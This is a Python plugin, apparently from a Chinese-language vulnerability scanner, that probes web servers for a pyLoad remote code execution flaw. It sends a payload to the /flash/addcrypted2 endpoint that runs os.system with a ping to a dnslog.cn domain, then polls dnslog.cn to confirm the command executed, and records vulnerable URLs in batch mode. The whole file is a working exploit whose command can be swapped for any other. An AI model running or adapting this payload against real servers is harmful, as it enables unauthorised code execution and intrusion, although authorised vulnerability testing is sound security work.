#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
import requests,urllib3
import random
urllib3.disable_warnings()

class PyLoad_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None
        self.__dnslog = requests.session()

    def dnslog(self):
        u = f"http://dnslog.cn/getdomain.php?t={random.random()}"

        req = self.__dnslog.get(u)
        return req.text.strip()
    def check_dnslog(self):
        u2 = f"http://dnslog.cn/getrecords.php?t={random.random()}"

        req = self.__dnslog.get(u2)
        if len(req.text) != 2:
            if not self.batch:
                OutPrintInfo("PyLoad", f"Dnslog: \n{req.text}")
            return True
        return False
    def send_payload(self,url):
        url2 = url + '/flash/addcrypted2'
        header = {
            "User-Agent": self.header,
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "119"
        }
        if not self.batch:
            OutPrintInfoSuc("PyLoad", f"开始获取dnslog...")
        dnslog = self.dnslog()
        if not self.batch:
            OutPrintInfoSuc("PyLoad", f"Dnslog: {dnslog}")
        cmd = f'ping {dnslog}'
        data = f'jk=pyimport%20os;os.system("{cmd}");f=function%20f2()'+ '{};&package=xxx&crypted=AAAA&&passwords=aaaa'

        try:
            req = requests.post(url2,verify=self.verify,proxies=self.proxy,headers=header,data=data)
            time.sleep(5)

            if self.check_dnslog():
                OutPrintInfoSuc("PyLoad", f"存在pyLoad远程代码执行漏洞: {url2}")
                if self.batch:
                    OutPutFile("pyload_rce.txt",f"存在pyLoad远程代码执行漏洞: {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("PyLoad", f"不存在pyLoad远程代码执行漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("PyLoad", "目标请求出错")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:

            OutPrintInfo("PyLoad", "开始检测pyLoad远程代码执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("PyLoad", "pyLoad远程代码执行漏洞检测结束")
